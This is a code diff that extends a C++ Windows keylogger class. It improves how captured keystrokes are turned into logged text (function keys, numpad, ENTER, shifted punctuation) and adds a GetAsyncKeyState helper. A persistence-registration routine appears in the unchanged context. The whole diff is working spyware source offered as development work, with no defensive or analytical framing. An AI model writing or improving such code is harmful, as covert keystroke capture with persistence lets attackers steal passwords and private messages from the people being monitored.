@@ -59,14 +59,30 @@ std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
 	std::string StringKey = "";
 	std::string SpecialChars = "1234567890";
 
+	if (Key >= 0x60 && Key <= 0x69) // it's a numpad key
+	{
+		StringKey = "[NUMPAD" + std::to_string(Key - 0x60) + "]";
+		return StringKey;
+	}
+
+	if (Key >= 0x70 && Key <= 0x87) // it means it's a function key
+	{
+		StringKey = "[F" + std::to_string(Key - 0x70 + 1) + "]";
+		return StringKey;
+	}
+
 	switch (Key) // check if it's virtual key
 	{
 	case VK_SPACE:
 		StringKey = " ";
 		return StringKey;
 
+	case VK_ESCAPE:
+		StringKey = "[ESC]";
+		return StringKey;
+
 	case VK_RETURN:
-		StringKey = "\n";
+		StringKey = "[ENTER]\n";
 		return StringKey;
 
 	case VK_SHIFT:
@@ -78,7 +94,7 @@ std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
 		return StringKey;
 
 	case VK_CAPITAL:
-		StringKey = "[CAPS_LOCK]";
+		StringKey = "[CAPS LOCK]";
 		return StringKey;
 
 	case VK_TAB:
@@ -109,6 +125,46 @@ std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
 		StringKey = "[ALT]";
 		return StringKey;
 
+	case VK_OEM_1:
+		StringKey = ";";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = ":";
+
+		return StringKey;
+
+	case VK_OEM_PLUS:
+		StringKey = "=";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "+";
+
+		return StringKey;
+
+	case VK_OEM_MINUS:
+		StringKey = "-";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "_";
+
+		return StringKey;
+
+	case VK_OEM_COMMA:
+		StringKey = ",";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "<";
+
+		return StringKey;
+
+	case VK_OEM_PERIOD:
+		StringKey = ".";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = ">";
+
+		return StringKey;
+
 	default:
 		StringKey = "";
 		break;
@@ -125,9 +181,9 @@ std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
 		StringKey.push_back(Key);
 	}
 
-	if (SpecialChars.find(Key) != std::string::npos)
+	if (Key >= '0' && Key <= '9')
 	{
-		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
+		if (IsPressed(VK_SHIFT))
 		{
 			switch (Key)
 			{
@@ -233,4 +289,9 @@ bool KeyLogger::RegisterPersistence()
 		return false;
 
 	return true;
+}
+
+bool KeyLogger::IsPressed(char Key)
+{
+	return (GetAsyncKeyState(Key) & MSB);
 }
